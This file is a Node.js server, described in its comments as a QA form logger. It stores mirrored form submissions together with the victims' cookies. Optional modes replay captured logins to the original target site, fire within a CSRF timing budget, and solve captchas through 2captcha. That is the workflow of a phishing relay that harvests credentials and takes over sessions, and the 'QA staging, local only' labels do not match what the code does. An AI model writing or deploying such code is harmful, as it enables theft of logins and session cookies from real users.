'use strict';
/**
 * QA mirror form logger — appends POST bodies to logs.json on this machine only.
 * Not exposed publicly; invoked by nginx mirror from the docker network.
 * With --test-login + --replay-original: invokes replay.js (internal mirror, then original target once).
 */
const http = require('http');
const fs = require('fs');
const path = require('path');
const TEST_LOGIN = process.env.TEST_LOGIN_ENABLED === 'true';
const ORIGINAL_REPLAY = process.env.ORIGINAL_REPLAY_ENABLED === 'true';
const SOLVE_CAPTCHA = process.env.SOLVE_CAPTCHA_ENABLED === 'true';

let replayLoginForm = null;
if (TEST_LOGIN) {
  replayLoginForm = require('./replay.js').replayLoginForm;
}

const PORT = Number.parseInt(process.env.LOGGER_PORT || '9090', 10);
const LOG_FILE = process.env.LOG_FILE || path.join(__dirname, 'logs.json');
const MAX_ENTRIES = Number.parseInt(process.env.LOGGER_MAX_ENTRIES || '500', 10);

function readEntries() {
  try {
    if (!fs.existsSync(LOG_FILE)) return [];
    const raw = fs.readFileSync(LOG_FILE, 'utf8');
    const parsed = JSON.parse(raw);
    return Array.isArray(parsed) ? parsed : [];
  } catch {
    return [];
  }
}

function appendEntry(entry) {
  const entries = readEntries();
  entries.push(entry);
  while (entries.length > MAX_ENTRIES) entries.shift();
  fs.mkdirSync(path.dirname(LOG_FILE), { recursive: true });
  fs.writeFileSync(LOG_FILE, JSON.stringify(entries, null, 2), 'utf8');
}

const server = http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/log') {
    const chunks = [];
    req.on('data', (chunk) => chunks.push(chunk));
    req.on('end', () => {
      const body = Buffer.concat(chunks).toString('utf8');
      const entry = {
        timestamp: new Date().toISOString(),
        method: req.headers['x-original-method'] || 'POST',
        path: req.headers['x-original-uri'] || '/',
        content_type: req.headers['content-type'] || '',
        body,
        headers: {
          referer: req.headers['x-original-referer'] || '',
          origin: req.headers['x-original-origin'] || '',
          user_agent: req.headers['x-original-user-agent'] || '',
          cookie: req.headers['x-original-cookie'] || '',
        },
        local_only: true,
        note: 'QA staging — manual review on this host only',
      };
      appendEntry(entry);

      if (TEST_LOGIN && replayLoginForm) {
        void replayLoginForm(entry).catch((err) => {
          console.error('[mirror-logger] replay error:', err && err.message ? err.message : err);
        });
      }

      res.writeHead(204);
      res.end();
    });
    return;
  }

  if (req.method === 'GET' && req.url === '/health') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ ok: true, entries: readEntries().length, log_file: LOG_FILE }));
    return;
  }

  res.writeHead(404, { 'Content-Type': 'text/plain' });
  res.end('not found');
});

server.listen(PORT, '0.0.0.0', () => {
  console.log('[mirror-logger] QA form logger on port ' + PORT + ' → ' + LOG_FILE);
  if (TEST_LOGIN) console.log('[mirror-logger] --test-login enabled → internal replay via replay.js');
  if (ORIGINAL_REPLAY) console.log('[mirror-logger] --replay-original enabled → one-shot replay to target origin');
  if (process.env.INSTANT_REPLAY_ENABLED === 'true') {
    console.log('[mirror-logger] --instant-replay enabled → delay=0, CSRF budget 300ms');
  }
  if (SOLVE_CAPTCHA) console.log('[mirror-logger] --solve-captcha enabled → 2captcha via captcha-solver.js');
});
